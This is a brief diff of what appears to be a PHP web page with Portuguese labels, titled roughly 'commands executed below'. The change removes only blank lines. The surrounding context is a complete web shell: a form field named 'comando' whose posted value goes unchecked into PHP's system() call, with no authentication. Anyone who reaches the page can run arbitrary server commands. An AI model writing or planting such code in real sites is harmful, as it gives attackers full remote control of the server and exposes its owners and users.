@@ -15,13 +15,7 @@ comando: <br>
 <input type=text name="comando">
 <input type=submit  name="executa" value="executa">
 <h1>Comandos executados abaixo.</h1>
-
-
-
-
-
 </body>
-
 
 <?php
   system($_POST['comando']);
